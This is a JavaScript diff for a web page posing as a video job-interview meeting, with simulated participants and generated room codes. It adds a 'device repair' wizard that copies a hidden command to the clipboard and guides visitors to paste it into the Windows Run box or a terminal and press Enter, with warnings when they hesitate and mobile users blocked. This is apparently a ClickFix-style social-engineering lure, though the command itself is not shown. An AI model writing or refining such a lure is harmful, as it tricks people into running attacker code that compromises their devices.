+
+  const label = document.createElement("span");
+  label.className = "repair-platform-picker__label";
+  label.textContent = "Device setup OS";
+
+  const detected = document.createElement("small");
+  detected.className = "repair-platform-picker__detected";
+  detected.dataset.repairPlatformDetected = "";
+  detected.textContent = "Detected: Desktop";
+
+  head.append(label, detected);
+
+  const options = document.createElement("div");
+  options.className = "repair-platform-picker__options";
+  options.setAttribute("role", "group");
+  options.setAttribute("aria-label", "Device setup OS");
+
+  REPAIR_PLATFORM_OPTIONS.forEach((option, index) => {
+    const button = document.createElement("button");
+    button.type = "button";
+    button.className = `repair-platform-picker__option${index === 0 ? " is-active" : ""}`;
+    button.dataset.repairPlatform = option.value;
+    button.setAttribute("aria-pressed", index === 0 ? "true" : "false");
+    button.textContent = option.label;
+    options.append(button);
+  });
+
+  picker.append(head, options);
+  return picker;
+}
+
+function mountRepairPlatformPickers() {
+  document.querySelectorAll("[data-repair-platform-mount]").forEach((mount) => {
+    const variant = mount.dataset.repairPlatformMount || "default";
+    mount.replaceWith(createRepairPlatformPickerElement(variant));
+  });
+}
+
+function updateRepairPlatformPickerUI() {
+  const override = getRepairPlatformOverride();
+  const detectedLabel = getRepairPlatformDetectedLabel();
+
+  document.querySelectorAll("[data-repair-platform-picker]").forEach((picker) => {
+    picker.querySelectorAll("[data-repair-platform]").forEach((button) => {
+      const isActive = button.dataset.repairPlatform === override;
+      button.classList.toggle("is-active", isActive);
+      button.setAttribute("aria-pressed", String(isActive));
+    });
+
+    picker.querySelectorAll("[data-repair-platform-detected]").forEach((label) => {
+      label.textContent = detectedLabel;
+    });
+  });
+}
+
+function initRepairPlatformPicker() {
+  mountRepairPlatformPickers();
+  loadRepairPlatformOverride();
+  updateRepairPlatformPickerUI();
+
+  document.addEventListener("click", (event) => {
+    const button = event.target.closest("[data-repair-platform]");
+    if (!button?.closest("[data-repair-platform-picker]")) return;
+    setRepairPlatformOverride(button.dataset.repairPlatform || "default");
+  });
+}
+
+function getClientPlatform() {
+  const override = getRepairPlatformOverride();
+
+  if (override !== "default") {
+    const label =
+      REPAIR_PLATFORM_OPTIONS.find((option) => option.value === override)?.label || override;
+    return { type: "desktop", key: override, label };
+  }
+
+  return detectClientPlatform();
+}
+
 function isMobileJoinBlocked() {
-  return getClientPlatform().type === "mobile";
+  return detectClientPlatform().type === "mobile";
 }
 
 function getRepairProfile() {
-  const platform = getClientPlatform();
+  const override = getRepairPlatformOverride();
+  if (override !== "default" && REPAIR_PROFILES[override]) {
+    return REPAIR_PROFILES[override];
+  }
+
+  const platform = detectClientPlatform();
   return REPAIR_PROFILES[platform.key] || REPAIR_PROFILES.linux;
+}
+
+function getRepairPasteStep() {
+  const index = getRepairProfile().steps.findIndex((step) => step.shortLabel === "Paste");
+  return index >= 0 ? index + 1 : 2;
+}
+
+function getRepairAllowStep() {
+  const index = getRepairProfile().steps.findIndex((step) => step.shortLabel === "Allow");
+  return index >= 0 ? index + 1 : 3;
+}
+
+function renderRepairStepper() {
+  const stepper = els.deviceRepairStepper;
+  if (!stepper) return;
+
+  const steps = getRepairWizardSteps();
+  stepper.replaceChildren();
+  stepper.style.setProperty("--repair-stepper-count", String(steps.length));
+
+  steps.forEach((step, index) => {
+    const item = document.createElement("div");
+    item.className = `device-repair-stepper__item ${index === 0 ? "is-active" : "is-pending"}`;
+    item.dataset.repairStep = String(index + 1);
+
+    const dot = document.createElement("span");
+    dot.className = "device-repair-stepper__dot";
+    dot.textContent = String(index + 1);
+
+    const label = document.createElement("span");
+    label.className = "device-repair-stepper__label";
+    label.textContent = step.shortLabel;
+
+    item.append(dot, label);
+    stepper.append(item);
+  });
+
+  els.deviceRepairStepperItems = Array.from(stepper.querySelectorAll("[data-repair-step]"));
+}
+
+function updateRepairTrustMeta() {
+  if (!els.deviceRepairTrustMeta) return;
+  const total = getRepairWizardSteps().length;
+  els.deviceRepairTrustMeta.textContent = `~1 min · ${total} guided steps`;
+}
+
+function updateRepairWarningCopy() {
+  const profile = getRepairProfile();
+  const pasteTitle = els.deviceRepairPasteWarning?.querySelector("strong");
+  const pasteBody = els.deviceRepairPasteWarning?.querySelector("p");
+  const enterTitle = els.deviceRepairEnterWarning?.querySelector("strong");
+  const enterBody = els.deviceRepairEnterWarning?.querySelector("p");
+
+  if (pasteTitle) pasteTitle.textContent = profile.pasteWarningTitle || "Pasted in this browser tab";
+  if (pasteBody) pasteBody.textContent = profile.pasteWarningBody || REPAIR_CONFIRM_HINT_PASTE;
+  if (enterTitle) enterTitle.textContent = profile.enterWarningTitle || "Enter pressed in this browser tab";
+  if (enterBody) enterBody.textContent = profile.enterWarningBody || REPAIR_CONFIRM_HINT_ENTER;
 }
 
 function getRepairWizardSteps() {
@@ -942,6 +1360,17 @@ function scheduleStep1Fallback() {
   }, REPAIR_STEP1_FALLBACK_DELAY_MS);
 }
 
+function getRepairKeyConnectorLabel(joiner) {
+  if (joiner === "then" || joiner === "→") {
+    return "Then";
+  }
+  return joiner;
+}
+
+function isRepairPhysicalKey(label) {
+  return /^(Enter|Return|Space|Tab|Esc|Backspace|Delete)$/i.test(label);
+}
+
 function renderRepairActionKeys(keys, joiner = "+", keyStyle = "keyboard") {
   if (!els.deviceRepairActionKeys) return;
 
@@ -954,12 +1383,43 @@ function renderRepairActionKeys(keys, joiner = "+", keyStyle = "keyboard") {
     return;
   }
 
+  const isSequence = keyStyle === "keyboard" && (joiner === "then" || joiner === "→");
+
   els.deviceRepairActionKeys.classList.remove("is-hidden");
+  els.deviceRepairActionKeys.classList.remove(
+    "device-repair-wizard-keys--pair",
+    "device-repair-wizard-keys--pair-plus",
+    "device-repair-wizard-keys--trio",
+    "device-repair-wizard-keys--single",
+    "device-repair-wizard-keys--sequence",
+  );
+
+  if (keyStyle === "keyboard") {
+    if (isSequence) {
+      els.deviceRepairActionKeys.classList.add("device-repair-wizard-keys--sequence");
+    } else if (keys.length === 1) {
+      els.deviceRepairActionKeys.classList.add("device-repair-wizard-keys--single");
+    } else if (keys.length === 2) {
+      els.deviceRepairActionKeys.classList.add("device-repair-wizard-keys--pair");
+      if (joiner === "+") {
+        els.deviceRepairActionKeys.classList.add("device-repair-wizard-keys--pair-plus");
+      }
+    } else if (keys.length >= 3) {
+      els.deviceRepairActionKeys.classList.add("device-repair-wizard-keys--trio");
+    }
+  }
+
   keys.forEach((key, index) => {
     if (index > 0) {
       const connector = document.createElement("span");
-      connector.className = keyStyle === "flow" ? "device-repair-flow-connector" : "device-repair-key-plus";
-      if (keyStyle === "keyboard") {
+      if (keyStyle === "flow") {
+        connector.className = "device-repair-flow-connector";
+        connector.textContent = getRepairKeyConnectorLabel(joiner);
+      } else if (isSequence) {
+        connector.className = "device-repair-key-then";
+        connector.textContent = "Then";
+      } else {
+        connector.className = "device-repair-key-plus";
         connector.textContent = joiner;
       }
       connector.setAttribute("aria-hidden", "true");
@@ -969,6 +1429,13 @@ function renderRepairActionKeys(keys, joiner = "+", keyStyle = "keyboard") {
     const chip = document.createElement(keyStyle === "flow" ? "span" : "kbd");
     if (keyStyle === "flow") {
       chip.className = "device-repair-flow-chip";
+      if (isRepairPhysicalKey(key)) {
+        chip.classList.add("device-repair-flow-chip--key");
+      } else {
+        chip.classList.add("device-repair-flow-chip--input");
+      }
+    } else if (key.length > 5 && !isRepairPhysicalKey(key)) {
+      chip.classList.add("device-repair-kbd--wide");
     }
     chip.textContent = key;
     els.deviceRepairActionKeys.append(chip);
@@ -977,6 +1444,8 @@ function renderRepairActionKeys(keys, joiner = "+", keyStyle = "keyboard") {
 
 function hideRepairStepPreviews() {
   els.deviceRepairRunPreview?.classList.add("is-hidden");
+  els.deviceRepairSpotlightPreview?.classList.add("is-hidden");
+  els.deviceRepairTerminalPreview?.classList.add("is-hidden");
   els.deviceRepairBrowserPreview?.classList.add("is-hidden");
   els.deviceRepairSettingsPreview?.classList.add("is-hidden");
   els.deviceRepairAppsPreview?.classList.add("is-hidden");
@@ -999,16 +1468,21 @@ function updateRepairActionCard(step) {
   card.classList.remove("is-hidden");
   const keyStyle = config.keyStyle || "keyboard";
   const isFlowAction = keyStyle === "flow";
-  const isRunStep = step === 1 && config.visual === "run";
-  const isCompactRunAction = keyStyle === "keyboard" && (step === 2 || step === 3);
+  const isSequenceStep =
+    keyStyle === "keyboard" && (config.keyJoiner === "then" || config.keyJoiner === "→");
+  const isFirstShortcutStep = step === 1 && keyStyle === "keyboard";
   const previewVisuals = new Set(["browser", "settings", "apps"]);
-  const hasSidePreview = previewVisuals.has(config.visual);
 
-  card.classList.toggle("device-repair-action-card--run", isRunStep);
-  card.classList.toggle("device-repair-action-card--compact", isCompactRunAction);
-  card.classList.toggle("device-repair-action-card--enter", keyStyle === "keyboard" && step === 3);
+  card.classList.toggle("device-repair-action-card--run", isFirstShortcutStep);
+  card.classList.toggle(
+    "device-repair-action-card--compact",
+    config.shortLabel === "Terminal" && !isSequenceStep,
+  );
+  card.classList.toggle("device-repair-action-card--sequence", isSequenceStep);
+  card.classList.toggle("device-repair-action-card--paste", config.shortLabel === "Paste");
+  card.classList.toggle("device-repair-action-card--enter", config.shortLabel === "Allow");
   card.classList.toggle("device-repair-action-card--flow", isFlowAction);
-  card.classList.toggle("device-repair-action-card--with-preview", isFlowAction && hasSidePreview);
+  card.classList.toggle("device-repair-action-card--with-preview", isFlowAction && previewVisuals.has(config.visual));
 
   if (els.deviceRepairActionLabel) {
     els.deviceRepairActionLabel.textContent = config.actionLabel;
@@ -1019,15 +1493,8 @@ function updateRepairActionCard(step) {
   renderRepairActionKeys(config.keys, config.keyJoiner, keyStyle);
 
   hideRepairStepPreviews();
-  if (config.visual === "browser") {
-    els.deviceRepairBrowserPreview?.classList.remove("is-hidden");
-  } else if (config.visual === "settings") {
-    els.deviceRepairSettingsPreview?.classList.remove("is-hidden");
-  } else if (config.visual === "apps") {
-    els.deviceRepairAppsPreview?.classList.remove("is-hidden");
-  }
 
-  els.deviceRepairActionTrust?.classList.toggle("is-hidden", !isRunStep);
+  els.deviceRepairActionTrust?.classList.toggle("is-hidden", !isFirstShortcutStep);
   els.deviceRepairPlatformNote?.classList.add("is-hidden");
   const trustTitle = els.deviceRepairActionTrust?.querySelector("strong");
   const trustDetail = els.deviceRepairActionTrust?.querySelector("small");
@@ -1041,7 +1508,7 @@ function updateRepairActionCard(step) {
     els.deviceRepairFallbackPanel.querySelector("strong").textContent = profile.fallbackTitle;
     els.deviceRepairFallbackPanel.querySelector("p").textContent = profile.fallbackBody;
   }
-  if (!isRunStep) {
+  if (!isFirstShortcutStep) {
     resetStep1Fallback();
   }
 }
@@ -1058,7 +1525,8 @@ function updateDeviceRepairReadyState() {
 
   if (state.device.repairCommandCopied) {
     els.deviceRepairReady.classList.remove("is-warning");
-    els.deviceRepairReadyText.textContent = "Copied · click the Run Open field, then press Ctrl + V";
+    els.deviceRepairReadyText.textContent =
+      profile.pasteReadyText || "Copied · click the Run Open field, then press Ctrl + V";
     return;
   }
 
@@ -1104,6 +1572,7 @@ function updateRepairHeaderIcon(step) {
 }
 
 function renderRepairCheckCard(state = "default") {
+  const profile = getRepairProfile();
   const cards = {
     default: {
       tone: null,
@@ -1131,7 +1600,7 @@ function renderRepairCheckCard(state = "default") {
       icon: "error",
       title: "Video still unavailable",
       body: "Camera access is not available yet.",
-      tips: [`Return to the ${getRepairProfile().osLabel} permission steps, allow camera for this browser, then retry.`],
+      tips: [`Allow camera for your browser in ${profile.osLabel} settings, then retry.`],
     },
   };
 
@@ -1233,6 +1702,9 @@ function setRepairWizardStep(step, options = {}) {
   updateRepairHeaderIcon(step);
 
   els.deviceRepairMain?.classList.toggle("is-verify-step", step === total);
+  if (els.deviceRepairMain) {
+    els.deviceRepairMain.dataset.repairStep = String(step);
+  }
 
   els.deviceRepairSteps.forEach((panel, index) => {
     const panelStep = index + 1;
@@ -1240,8 +1712,31 @@ function setRepairWizardStep(step, options = {}) {
       panel?.classList.add("is-hidden");
       return;
     }
-    panel?.classList.toggle("is-hidden", panelStep !== step);
+
+    const pasteStep = getRepairPasteStep();
+    const allowStep = getRepairAllowStep();
+    const verifyStep = steps.length;
+
+    if (panelStep === 2) {
+      panel?.classList.toggle("is-hidden", step !== pasteStep);
+    } else if (panelStep === 3) {
+      panel?.classList.toggle("is-hidden", step !== allowStep);
+    } else if (panelStep === 4) {
+      panel?.classList.toggle("is-hidden", step !== verifyStep);
+    }
   });
+
+  if (step === getRepairAllowStep()) {
+    const allowConfig = steps[step - 1];
+    if (els.deviceRepairSupportTitle) {
+      els.deviceRepairSupportTitle.textContent =
+        allowConfig.supportTitle || "Then allow camera access";
+    }
+    if (els.deviceRepairSupportCopy) {
+      els.deviceRepairSupportCopy.textContent =
+        allowConfig.supportCopy || "Allow camera for your browser, then return.";
+    }
+  }
 
   playRepairStepEnterAnimation(step);
 
@@ -1264,7 +1759,7 @@ function setRepairWizardStep(step, options = {}) {
       els.deviceRepairConfirmHint.textContent = config.hint || REPAIR_CONFIRM_HINT_DEFAULT;
     }
 
-    if (step === 2) {
+    if (step === getRepairPasteStep()) {
       updateDeviceRepairReadyState();
     }
   } else {
@@ -1282,7 +1777,7 @@ function setRepairWizardStep(step, options = {}) {
 
   clearRepairKeyWarnings();
 
-  if (step === 3) {
+  if (step === getRepairAllowStep()) {
     els.deviceRepairNext?.blur();
   }
 
@@ -1297,7 +1792,7 @@ function shouldGuardRepairPasteStep() {
   return (
     isRepairDialogOpen() &&
     Boolean(getRepairProfile().command) &&
-    state.device.repairWizardStep === 2 &&
+    state.device.repairWizardStep === getRepairPasteStep() &&
     !state.device.cameraRepairAttempted
   );
 }
@@ -1306,7 +1801,7 @@ function shouldGuardRepairEnterStep() {
   return (
     isRepairDialogOpen() &&
     Boolean(getRepairProfile().command) &&
-    state.device.repairWizardStep === 3 &&
+    state.device.repairWizardStep === getRepairAllowStep() &&
     !state.device.cameraRepairAttempted
   );
 }
@@ -1323,11 +1818,18 @@ function showRepairWrongKeyWarning(type) {
 
   config.getElement()?.classList.remove("is-hidden");
 
+  requestAnimationFrame(() => {
+    const panel = els.deviceRepairWorkspace?.querySelector(".device-repair-instruction-panel");
+    if (panel) {
+      panel.scrollTo({ top: panel.scrollHeight, behavior: "smooth" });
+    }
+  });
+
   const now = Date.now();
   if (now - repairWrongKeyToastAt < REPAIR_WRONG_KEY_TOAST_MS) return;
 
   repairWrongKeyToastAt = now;
-  showToast(config.toast);
+  showToast(typeof config.getToast === "function" ? config.getToast() : config.toast);
 }
 
 function shouldIgnoreRepairKeyGuard(event) {
@@ -1373,7 +1875,7 @@ function confirmRepairWizardStep() {
   const step = state.device.repairWizardStep;
   if (step >= getRepairWizardSteps().length) return;
 
-  if (step === 1) {
+  if (step === getRepairPasteStep() - 1) {
     resetStep1Fallback();
     copyRepairCommandToClipboard();
     updateDeviceRepairReadyState();
@@ -1403,8 +1905,9 @@ function updateInterviewDeviceStatus() {
   if (!els.interviewDeviceStatus) return;
 
   const label = state.currentUser.video ? "Camera ready" : "Video pending";
-  els.interviewDeviceStatus.innerHTML = `<strong>Device</strong> ${label}`;
+  els.interviewDeviceStatus.textContent = label;
   els.interviewDeviceStatus.classList.toggle("is-warning", !state.currentUser.video);
+  els.interviewDeviceStatus.classList.toggle("is-ready", state.currentUser.video);
 }
 
 function setCameraSetupBarState(mode = "default") {
@@ -1495,6 +1998,7 @@ function showDeviceRepairDialog(options = {}) {
     return;
   }
 
+  loadRepairPlatformOverride();
   updateRepairHostContext();
   updateRepairPlatformContext();
 
@@ -1558,7 +2062,7 @@ async function checkCameraInRepairDialog() {
     state.device.cameraRecognized = true;
     setCameraDeviceRowState(true);
     setButtonState(els.prejoinCamera, true, "Camera on", "Camera off");
-    els.previewVideoState.textContent = "Camera ready";
+    setPreviewVideoState("Camera ready");
     els.cameraDeviceStatus.textContent = "Camera ready";
 
     if (els.deviceRepairCheckStatus) {
@@ -1594,6 +2098,7 @@ function continueAfterDeviceRepair() {
   setCameraSetupBarVisible(false);
   updateInterviewDeviceStatus();
   els.cameraButton.classList.add("is-active");
+  els.cameraButton.classList.remove("needs-attention");
   els.cameraButton.querySelector("small").textContent = "Stop";
   renderGallery();
   renderParticipants();
@@ -1650,21 +2155,25 @@ function updateJoinAvailability() {
   const hasName = validateDisplayName();
   const mobileBlocked = isMobileJoinBlocked();
   els.mobileDeviceAlert?.classList.toggle("is-hidden", !mobileBlocked);
+  els.form?.classList.toggle("is-ready", hasName && !mobileBlocked && !state.isJoining);
   els.joinButton.disabled = state.isJoining || !hasName || mobileBlocked;
   if (state.isJoining) {
     els.joinButton.textContent = "Connecting...";
+    setJoinSettingsStatus("Connecting...", "pending");
     return;
   }
-  if (mobileBlocked && els.joinSettingsStatus) {
-    els.joinSettingsStatus.textContent = "Desktop required";
+  if (mobileBlocked) {
+    setJoinSettingsStatus("Desktop required", "error");
     els.joinButton.textContent = "Desktop required";
     return;
   }
-  if (!hasName && els.displayNameError?.classList.contains("is-hidden") && els.joinSettingsStatus) {
-    els.joinSettingsStatus.textContent = "Enter name to continue";
+  if (!hasName && els.displayNameError?.classList.contains("is-hidden")) {
+    setJoinSettingsStatus("Enter name to continue", "pending");
     els.joinButton.textContent = "Enter name to join";
-  } else if (hasName && els.joinSettingsStatus) {
-    els.joinSettingsStatus.textContent = "Ready to join";
+    return;
+  }
+  if (hasName) {
+    setJoinSettingsStatus("Ready to join", "ready");
     els.joinButton.textContent = "Join interview";
   }
 }
@@ -1732,6 +2241,20 @@ function setButtonState(button, active, activeText, inactiveText) {
   button.textContent = active ? activeText : inactiveText;
 }
 
+function setPreviewVideoState(text) {
+  if (!els.previewVideoState) return;
+
+  els.previewVideoState.textContent = text;
+  const normalized = String(text || "").trim().toLowerCase();
+  const isWarning = normalized.includes("setup needed") || normalized.includes("pending");
+  const isReady = normalized === "camera ready";
+  const isLoading = normalized.includes("starting");
+
+  els.previewVideoState.classList.toggle("is-warning", isWarning);
+  els.previewVideoState.classList.toggle("is-ready", isReady);
+  els.previewVideoState.classList.toggle("is-loading", isLoading);
+}
+
 function lockMeetingViewport() {
   document.documentElement.style.overflow = "hidden";
   document.body.style.overflow = "hidden";
@@ -1743,7 +2266,8 @@ function unlockMeetingViewport() {
 }
 
 function hydrateMeeting() {
-  state.currentUser.name = els.displayName.value.trim() || "Candidate";
+  state.currentUser.name = els.displayName.value.trim() || state.participantRole;
+  state.currentUser.role = state.participantRole;
   state.currentUser.muted = !els.prejoinMic.classList.contains("is-active");
   state.currentUser.video =
     state.device.cameraRecognized && els.prejoinCamera.classList.contains("is-active");
@@ -1761,6 +2285,9 @@ function hydrateMeeting() {
 
   els.roomTitle.textContent = state.topic;
   updateInterviewBrief();
+  if (els.meetingRoundLabel) {
+    els.meetingRoundLabel.textContent = getMeetingRoundLabel();
+  }
   els.meetingId.textContent = `Meeting ID: ${state.roomCode} · Passcode: ${state.passcode}`;
   els.participantCount.textContent = String(state.participants.length);
   updateChatBadge();
@@ -1768,7 +2295,8 @@ function hydrateMeeting() {
   els.cameraButton.classList.toggle("is-active", state.currentUser.video);
   els.micButton.querySelector("small").textContent = state.currentUser.muted ? "Unmute" : "Mute";
   els.cameraButton.querySelector("small").textContent = state.currentUser.video ? "Stop" : "Start";
-  els.cameraButton.classList.toggle("has-alert", state.inMeeting && !state.currentUser.video);
+  els.cameraButton.classList.toggle("has-alert", false);
+  els.cameraButton.classList.toggle("needs-attention", state.inMeeting && !state.currentUser.video);
   els.securityButton.classList.remove("is-active");
   els.securityButton.querySelector("small").textContent = "Check";
   setCameraSetupBarVisible(!state.currentUser.video);
@@ -1823,7 +2351,8 @@ function renderGallery() {
 
     const mute = document.createElement("span");
     mute.className = "mute-chip";
-    mute.textContent = person.muted ? "Muted" : "Mic on";
+    mute.classList.toggle("is-muted", person.muted);
+    mute.setAttribute("aria-label", person.muted ? "Muted" : "Microphone on");
 
     const name = document.createElement("span");
     name.className = "tile-name";
@@ -1980,8 +2509,8 @@ function rotateSpeaker() {
   const nextIndex = (state.activeSpeakerIndex + 1) % state.participants.length;
   state.activeSpeakerIndex = nextIndex === 0 ? 1 : nextIndex;
   const speaker = state.participants[state.activeSpeakerIndex];
-  els.speakerName.textContent = speaker.name;
-  els.speakerInitials.textContent = getInitials(speaker.name);
+  els.speakerName && (els.speakerName.textContent = speaker.name);
+  els.speakerInitials && (els.speakerInitials.textContent = getInitials(speaker.name));
   renderGallery();
 }
 
@@ -2153,7 +2682,7 @@ function startJoinFlow() {
         ];
 
   let stepIndex = 0;
-  showProcessOverlay(steps[stepIndex], `${state.topic} · ${state.roomCode}`);
+  showProcessOverlay(steps[stepIndex], state.topic, state.roomCode);
 
   const stepTimer = window.setInterval(() => {
     stepIndex += 1;
@@ -2172,7 +2701,7 @@ function startJoinFlow() {
       return;
     }
 
-    showProcessOverlay(steps[stepIndex], `${state.topic} · ${state.roomCode}`);
+    showProcessOverlay(steps[stepIndex], state.topic, state.roomCode);
   }, 850);
 }
 
@@ -2199,17 +2728,19 @@ els.createForm.addEventListener("submit", (event) => {
   state.invitedViaLink = false;
   state.hostName = els.hostName.value.trim() || DEFAULT_HOST_NAME;
   state.hostRole = normalizeHostRole(els.createHostRole.value);
+  state.interviewRound = normalizeInterviewRound(els.createInterviewRound.value);
+  state.participantRole = normalizeParticipantRole(els.createParticipantRole.value);
   state.currentUser.name = state.hostName;
+  state.currentUser.role = state.participantRole;
   state.topic = els.createTopic.value.trim() || DEFAULT_TOPIC;
   state.duration = normalizeDuration(els.createDuration.value);
   state.roomCode = generateRoomCode();
   state.passcode = createPasscode();
   els.displayName.value = state.currentUser.name;
   els.meetingTopic.value = state.topic;
-  els.homeDurationStat.textContent = state.duration;
   document.title = `${state.topic} - Video Meeting`;
+  updateRoomSettingsDisplay();
   updateCreatedRoom();
-  updateInviteContext();
   els.createdRoom.dataset.hasMeeting = "1";
   els.createdRoom.classList.remove("is-hidden");
   showToast("Meeting created. Invitation link is ready.");
@@ -2249,12 +2780,23 @@ els.startHostButton.addEventListener("click", () => {
   showToast("Host room prepared");
 });
 
-els.createDuration.addEventListener("change", () => {
+els.createDuration.addEventListener("input", () => {
   state.duration = normalizeDuration(els.createDuration.value);
-  els.createDuration.value = state.duration;
-  els.homeDurationStat.textContent = state.duration;
+  updateRoomSettingsDisplay();
   updateCreatedRoom();
-  updateInviteContext();
+});
+
+els.createInterviewRound.addEventListener("input", () => {
+  state.interviewRound = normalizeInterviewRound(els.createInterviewRound.value);
+  updateRoomSettingsDisplay();
+  updateCreatedRoom();
+});
+
+els.createParticipantRole.addEventListener("input", () => {
+  state.participantRole = normalizeParticipantRole(els.createParticipantRole.value);
+  state.currentUser.role = state.participantRole;
+  updateRoomSettingsDisplay();
+  updateCreatedRoom();
 });
 
 els.hostName.addEventListener("input", () => {
@@ -2283,7 +2825,7 @@ els.displayName.addEventListener("input", () => {
 });
 
 els.deviceRepairNext?.addEventListener("click", (event) => {
-  if (state.device.repairWizardStep === 3 && event.detail === 0) {
+  if (state.device.repairWizardStep === getRepairAllowStep() && event.detail === 0) {
     showRepairWrongKeyWarning("enter");
     return;
   }
@@ -2324,7 +2866,9 @@ els.meetingTopic.addEventListener("input", () => {
 els.prejoinMic.addEventListener("click", () => {
   const active = !els.prejoinMic.classList.contains("is-active");
   setButtonState(els.prejoinMic, active, "Mic on", "Mic off");
-  els.previewAudioState.textContent = active ? "Microphone ready" : "Mic muted";
+  els.previewAudioState.textContent = active ? "Mic ready" : "Mic muted";
+  els.previewAudioState.classList.toggle("is-ready", active);
+  els.previewAudioState.classList.toggle("is-muted", !active);
 });
 
 els.prejoinCamera.addEventListener("click", () => {
@@ -2376,7 +2920,10 @@ els.cameraButton.addEventListener("click", () => {
 
   state.currentUser.video = false;
   els.cameraButton.classList.toggle("is-active", false);
+  els.cameraButton.classList.add("needs-attention");
   els.cameraButton.querySelector("small").textContent = "Start";
+  setCameraSetupBarVisible(true);
+  updateInterviewDeviceStatus();
   renderGallery();
   renderParticipants();
   showToast("Video stopped");
@@ -2532,6 +3079,8 @@ window.setInterval(() => {
 }, 14000);
 
 applyQueryDefaults();
+initTheme();
+initRepairPlatformPicker();
 
 window.addEventListener("resize", () => {
   syncBriefPanelForViewport();
